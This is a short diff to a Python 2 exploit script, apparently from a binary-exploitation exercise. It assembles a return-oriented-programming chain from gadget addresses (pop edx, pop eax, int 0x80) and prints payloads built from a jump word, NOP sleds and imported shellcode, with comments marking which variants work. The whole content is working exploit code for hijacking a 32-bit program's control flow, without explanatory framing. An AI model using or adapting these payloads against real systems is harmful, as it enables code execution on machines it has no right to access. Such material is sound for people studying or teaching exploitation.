@@ -6,7 +6,9 @@ from shellcode import shellcode
 from struct import pack
 
 # Padding goes here
-p = ""
+# Padding goes here
+p = ''
+
 p += pack('<I', 0x080573ea) # pop edx ; ret
 p += pack('<I', 0x080ef060) # @ .data
 p += pack('<I', 0x080c2406) # pop eax ; ret
@@ -43,7 +45,9 @@ p += pack('<I', 0x080495a9) # int 0x80
 
 if sys.argv[1] == '1':
 #	print "A"*32
-	print  pack('<I',0xeb819090)+ "\x90"*4 + shellcode
+#working#	print  pack('<I',0xeb819090)+ "\x90"*4 + shellcode
+	print  pack('<I',0x909006EB)+ "\x90"*4 + shellcode #works as well with better jump command
+#	print  pack('<I',0x909006EB)+ "\x90"*4 + p
 #	print p
 elif sys.argv[1] == '2':
 #	print "B"*40 + pack('<I',0xbffee788) + pack('<I', 0x80f3720)
